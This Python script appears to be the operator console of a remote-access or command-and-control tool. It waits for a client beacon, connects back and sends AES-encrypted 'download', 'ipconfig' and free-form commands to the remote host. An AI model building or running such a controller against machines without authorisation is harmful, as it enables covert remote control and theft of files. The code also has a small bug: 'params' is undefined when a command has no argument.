from listener.communication import Communication
from listener.cipher import Cipher
from tools.env import EnvReader
from commands.help import help
import json


def main():
    env = EnvReader()

    listener = Communication(
        port=int(env.get("SERVER_PORT"))
    )

    while True:
        client_init = listener.init_listen()
        if client_init is not None:
            client_addr = client_init["addr"][0]
            data = json.loads(client_init["data"])
            client_os = data["params"]
            break
        else:
            print(client_init)

    listener.connect(client_addr)

    cipher = Cipher(
        key=env.get("CRYPTO_KEY").encode('utf-8'),
        iv=env.get("CRYPTO_IV").encode('utf-8')
    )
    while True:

        command = input("> ").strip()
        if ' ' in command:
            command, params = command.split(' ', 1)

        if command == "help":
            help()

        elif command == "stop":
            listener.stop()
            break

        elif command == "download" or command == "ipconfig":
            request = json.dumps({
                'type': 'command',
                'action': command,
                'params': params
            }).encode('utf-8')
            response = listener.prompt(cipher.encrypt_message(request))
            decrypted = cipher.decrypt_message(response)
            print(response)
            print(json.loads(decrypted))

        else:
            data = json.dumps(
                {
                    'message': command
                }
            ).encode('utf-8')

            listener.send(cipher.encrypt_message(data))


if __name__ == '__main__':
    main()
